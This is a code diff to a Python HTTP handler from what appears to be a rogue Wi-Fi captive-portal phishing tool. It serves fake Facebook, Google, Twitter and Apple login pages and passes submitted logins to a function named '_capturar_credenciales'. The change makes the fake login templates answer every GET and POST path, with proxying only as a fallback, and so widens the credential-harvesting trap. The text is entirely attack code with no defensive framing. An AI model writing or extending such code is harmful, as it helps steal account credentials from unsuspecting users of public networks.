@@ -87,14 +87,15 @@ class Handler(BaseHTTPRequestHandler):
         if self._es_captive():
             self._responder_captive()
             return
-        if self.path == "/login" or self.path == "/":
-            template = self._elegir_template()
-            if template:
+
+        template = self._elegir_template()
+        if template:
+            if self.path in ("/login/facebook", "/login/google", "/login/twitter", "/login/apple"):
+                self._enviar_html(self._login_social(self.path))
+            else:
                 self._enviar_html(template)
-                return
-        if self.path in ("/login/facebook", "/login/google", "/login/twitter", "/login/apple"):
-            self._enviar_html(self._login_social(self.path))
             return
+
         self._proxy_request("GET")
 
     def _login_social(self, path):
@@ -133,6 +134,10 @@ class Handler(BaseHTTPRequestHandler):
     def do_POST(self):
         if self.path == "/login" or self.path.startswith("/login/"):
             self._capturar_credenciales()
+            return
+        template = self._elegir_template()
+        if template:
+            self._enviar_html(template)
             return
         self._proxy_request("POST")
 
